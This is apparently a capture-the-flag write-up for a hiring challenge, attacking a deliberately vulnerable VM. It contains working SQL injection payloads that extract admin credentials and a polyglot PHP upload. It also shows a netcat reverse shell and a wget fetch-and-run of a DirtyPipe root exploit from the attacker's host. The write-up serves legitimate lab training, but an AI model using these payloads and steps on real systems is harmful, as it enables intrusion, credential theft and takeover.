# Saptang Labs Hiring Challenge

<br/>

---

<br/>

**Challenge Type** : _Blackbox Testing_


**Challenge Description** :

Download the VM and start it. It has a web application hosted which is configured to boot at start so you can put the VM in the background. 
Simply find the address of the application and start pentesting.


**Challenge Goal** :
_Find the file `flag.txt` and read its content._

---

First we start by finding the IP of machine here i used the `netdiscover` command.

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $sudo netdiscover -r 192.168.1.12/24
Currently scanning: Finished!   |   Screen View: Unique Hosts                 
                                                                               
 5 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 300               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.1.4     **:**:**:**:**:**      1      60  CHONGQING FUGUI ELECTRONICS 
 192.168.1.1     **:**:**:**:**:**      1      60  Syrotech Networks. Ltd.     
 192.168.1.5     **:**:**:**:**:**      1      60  Intel Corporate             
 192.168.1.21    **:**:**:**:**:**      1      60  Intel Corporate             

```
here `192.168.1.1` is ip of router.

we scane the IP `192.168.1.5`,`192.168.1.21` and the IP `192.168.1.21` have web service running at port 42710.

I use `rustscan` for port scaning in CTFs because it is insanely fast.

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $rustscan -a 192.168.1.21
File limit higher than batch size. Can increase speed by increasing batch size '-b 924'.
Open 192.168.1.21:42710
Starting Script(s)
Script to be run Some("nmap -vvv -p {{port}} {{ip}}")
...
```
opening this website we have nothing but this page:

<img width="397" alt="image" src="https://user-images.githubusercontent.com/79740895/208959026-568a1c93-0751-4386-9bf7-79a56ddbbabc.png">

First though was to look for `robots.txt` file but no luck so i did directory bruteforcing with gobuster.

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $gobuster dir -u http://192.168.1.21:42710/ -w /usr/share/wordlists/dirb/common.txt 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.21:42710/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/12/21 22:09:58 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 280]
/.htaccess            (Status: 403) [Size: 280]
/.htpasswd            (Status: 403) [Size: 280]
/Admin                (Status: 301) [Size: 321] [--> http://192.168.1.21:42710/Admin/]
/assets               (Status: 301) [Size: 322] [--> http://192.168.1.21:42710/assets/]
/includes             (Status: 301) [Size: 324] [--> http://192.168.1.21:42710/includes/]
/index.php            (Status: 200) [Size: 349]                                          
/search_result        (Status: 301) [Size: 329] [--> http://192.168.1.21:42710/search_result/]
/server-status        (Status: 403) [Size: 280]                                               
                                                                                              
===============================================================
2022/12/21 22:10:05 Finished
===============================================================

```

now we have some interesting directories like Admin and search_result.

Admin page requires authentication Username and Password.

[http://192.168.1.21:42710/search_result/](http://192.168.1.21:42710/search_result/)

<img width="240" alt="image" src="https://user-images.githubusercontent.com/79740895/208960036-f154d56c-5bbf-4b35-8d97-b39dcf34c217.png">

now this is something interesting there is link to 

[http://192.168.1.21:42710/search_result/result_2022.php](http://192.168.1.21:42710/search_result/result_2022.php)

<img width="544" alt="image" src="https://user-images.githubusercontent.com/79740895/208960308-7fa28195-3dc5-40ec-b877-5b1922e29dcf.png">

_The Results of 2022 have not been published yet_ so let's try 2021 : 

[http://192.168.1.21:42710/search_result/result_2021.php](http://192.168.1.21:42710/search_result/result_2021.php)

<img width="913" alt="image" src="https://user-images.githubusercontent.com/79740895/208960741-f610c650-98f4-40dd-87dd-5102f9e3e1ee.png">

<br/>

on submitting the form we have this response:

<br/>

<img width="916" alt="image" src="https://user-images.githubusercontent.com/79740895/208962242-acde389b-6d0b-4746-9508-19670e187ebc.png">

`ID, Name, Roll, Marks` it looks like it is fetching this data from sql database so lets try SQL injection.

this POST request have `data=NjIxNzI5NTgx` it base64 encoded value of `621729581`.

lets try with simple payload `' OR 1=1 #` but it is not working after few tries i tried `621729581 OR 1=1` base64 encode and it gives us all the entries hooray,
and that is successful SQL injection.

payload= 
```
data=<@base64>621729581 OR 1=1<@/base64>
``` 
<-- I'm using Hackvertor burp extension.

<img width="918" alt="image" src="https://user-images.githubusercontent.com/79740895/208964245-b65f25db-f151-4791-8cf1-c43d3a977d9d.png">

we know the number of columns it is 4 : `ID,	Name,	Roll,	Marks`.So the payload for union attack would be:

payload: 
```
data=<@base64>621729581 UNION SELECT NULL, NULL, NULL, NULL<@/base64>
```

It gives us the result in response so payload is correct and we also know the data types it should be Integer for ID, Roll, Marks and String for Name so we can put this values in payload.

payload: 
```
data=<@base64>621729581 UNION SELECT 1, "name", 2, 3<@/base64>
```

response:

<img width="174" alt="image" src="https://user-images.githubusercontent.com/79740895/208965679-8c116a48-31b5-4c6c-a8d8-d7e39ae5c49a.png">

Now we can try to extract the databases'name, tables'name, columns'name.

Reference: 
[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)

payload: 
```
data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,schema_name,0x7c), 2, 3 fRoM information_schema.schemata<@/base64>
```

response:

```
|mysql|,|information_schema|,|performance_schema|,|sys|,|ezbox|
```

Now let's try to extract table name.

payload: 
```
data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,table_name,0x7c), 2, 3 fRoM information_schema.tables<@/base64>
```

response:

```
|results|,|users|,|ADMINISTRABLE_ROLE_AUTHORIZATIONS|,|APPLICABLE_ROLES|,|CHARACTER_SETS|,|CHECK_CONSTRAINTS|,|COLLATIONS|,|COLLATION_CHARACTER_SET_APPLICABILITY|,|COLUMNS|,|COLUMNS_EXTENSIONS|,|COLUMN_PRIVILEGES|,|COLUMN_STATISTICS|,|ENABLED_ROLES|,|ENGINES|,|EVENTS|,|FILES|,|INNODB_BUFFER_PAGE|,|INNODB_BUFFER_PAGE_LRU|,|INNODB_BUFFER_POOL_STATS|,|INNODB_CACHED_INDEXES|,|INNODB_CMP|,|INNODB_CMPMEM|,|INNODB_CMPMEM_RESET|,|INNODB_CMP_PER_INDEX|,|INNODB_CMP_PER_INDEX_RESET|,|INNODB_CMP_RESET|,|INNODB_COLUMNS|,|INNODB_DATAFILES|,|INNODB_FIELDS|,|INNODB_FOREIGN|,|INNODB_FOREIGN_COLS|,|INNODB_FT_BEING_DELETED|,|INNODB_FT_CONFIG|,|INNODB_FT_DEFAULT_STOPWORD|,|INNODB_FT_DELETED|,|INNODB_FT_INDEX_CACHE|,|INNODB_FT_INDEX_TABLE|,|INNODB_INDEXES|,|INNODB_METRICS|,|INNODB_SESSION_TEMP_TABLESPACES|,|INNODB_TABLES|,|INNODB_TABLESPACES|,|INNODB_TABLESPACES_BRIEF|,|INNODB_TABLESTATS|,|INNODB_TEMP_TABLE_INFO|,|INNODB_TRX|,|INNODB_VIRTUAL|,|KEYWORDS|,|KEY_COLUMN_USAGE|,|OPTIMIZER_TRACE|,|PARAMETERS|,|PARTITIONS|,|PLUGINS|,|PRO
```


We have table with name `users` let's see the columns of this table.

payload: 
```
data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,column_name,0x7c), 2, 3 fRoM information_schema.columns wHeRe table_name="users"<@/base64>
```

response:

```
|id|,|password|,|profile_picture|,|username|,|CURRENT_CONNECTIONS|,|TOTAL_CONNECTIONS|,|USER|
```

We have username and password here what should we do extract them!

payload: 
```
data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,username,0x7c), 2, 3 fRoM users<@/base64>
```

response: ```|Admin|```

username=Admin

payload: 
```
data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,password,0x7c), 2, 3 fRoM users<@/base64>
```

response: ```|zohl8meicohci9raw0|```

password=zohl8meicohci9raw0

We have username and password let's login as Admin.

http://192.168.1.21:42710/Admin/dashboard.php

<img width="929" alt="image" src="https://user-images.githubusercontent.com/79740895/208969394-1dd39a65-4610-4344-a776-bc499c46fd7a.png">

looking at source code we have this comment:

<img width="268" alt="image" src="https://user-images.githubusercontent.com/79740895/208969571-d42ef165-ef6c-4f45-b8b2-ff8a27d66335.png">

visiting this page http://192.168.1.21:42710/Admin/edit_profile.php

<img width="321" alt="image" src="https://user-images.githubusercontent.com/79740895/208969819-070314c6-98a8-473a-811f-faf3b991b983.png">

We have functionality of file upload let's try uploading some php file.

Oops error can't upload php, let's try simple jpg file.

<img width="279" alt="image" src="https://user-images.githubusercontent.com/79740895/208970421-24489ab8-94a5-4370-9eab-c0e5c330c70f.png">

so we can only upload jpg file but how it is checking for file type extension? let's do one experiment rename the jpg file to php if error it is looking for extension and if successful it is checking MIME type.

Record updated successfullyThe file has been uploaded

so MIME type it is.

We have to create polyglot PHP/JPG payload. how i do it is open jpg file and append php payload at last so let's create [simple.php](files/simple.php) payload.

**Record updated successfullyThe file has been uploaded** and file is uploaded successfully but where ?

we have column name profile_picture in users table, if you remember that we still have SQLi.

payload=
```
data=<@base64>621729581 UNION SELECT 1, gRoUp_cOncaT(0x7c,profile_picture,0x7c), 2, 3 fRoM users<@/base64>
```

result = ```|../assets/uploads/simple.php|```

so our file is at http://192.168.1.21:42710/assets/uploads/simple.php

<img width="759" alt="image" src="https://user-images.githubusercontent.com/79740895/208973100-2b05bb94-de13-42f2-bd9d-e6c978989c45.png">

It works just fine let's get reverse shell. for reference: [https://www.revshells.com/](https://www.revshells.com/)

[revshell.php](files/revshell.php)

we start listener: ```nc -lvnp 8888```

and path= http://192.168.1.21:42710/assets/uploads/revshell.php

on visiting this file we have reverse shell:

```Shell
┌─[aftab@parrot]─[~/Downloads/practice/challenge]
└──╼ $nc -lvnp 8888
listening on [any] 8888 ...
connect to [192.168.1.12] from (UNKNOWN) [192.168.1.21] 38442
Linux heathrow-VirtualBox 5.11.0-16-generic #17-Ubuntu SMP Wed Apr 14 20:12:43 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
 23:44:47 up  2:01,  1 user,  load average: 0.00, 0.01, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
heathrow tty2     tty2             21:32    2:12m  0.03s  0.03s /usr/libexec/gnome-session-binary --systemd --session=ubuntu
uid=33(www-data) gid=33(www-data) groups=33(www-data)
bash: cannot set terminal process group (732): Inappropriate ioctl for device
bash: no job control in this shell
www-data@heathrow-VirtualBox:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@heathrow-VirtualBox:/$ 

```

We have shell but we can't access /home/heathrow we need to escalate our privilege. first thing that comes in mind is linpeas.sh 
let's move that to victim machine i create local server with python `python -m http.server 80`, 
to transfer file because we normally don't have internet access in victim machine.

change permissions to +x : ```chmod +x linpeas.sh```

Now run the file: ```./linpeas.sh```

Analyzing the output we have first suggestion for **[CVE-2022-0847] DirtyPipe**:

<img width="310" alt="image" src="https://user-images.githubusercontent.com/79740895/208977841-a68b2f57-224e-44ae-b548-103ce9b3b21c.png">

reference: [https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits)

we follow the steps in GitHub repo and we have `exploit-1`, `exploit-2`. transfer this to victim machine and run.

```Shell
www-data@heathrow-VirtualBox:/tmp$ wget 192.168.1.12/exploit-2
wget 192.168.1.12/exploit-2
--2022-12-22 00:04:11--  http://192.168.1.12/exploit-2
Connecting to 192.168.1.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 21480 (21K) [application/octet-stream]
Saving to: 'exploit-2'

     0K .......... ..........                                 100%  395K=0.05s

2022-12-22 00:04:11 (395 KB/s) - 'exploit-2' saved [21480/21480]
```

```Shell
www-data@heathrow-VirtualBox:/tmp$ ./exploit-2 /usr/bin/sudo
./exploit-2 /usr/bin/sudo
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
find / -type f -name "flag.txt" 2>/dev/null
/home/heathrow/flag.txt
cat /home/heathrow/flag.txt
flag{box_cracked_successfully_report_to_admin}challenge
```

---

flag: 
```Shell
flag{box_cracked_successfully_report_to_admin}challenge 
```

<br/>

:octocat: Happy Hacking :octocat:
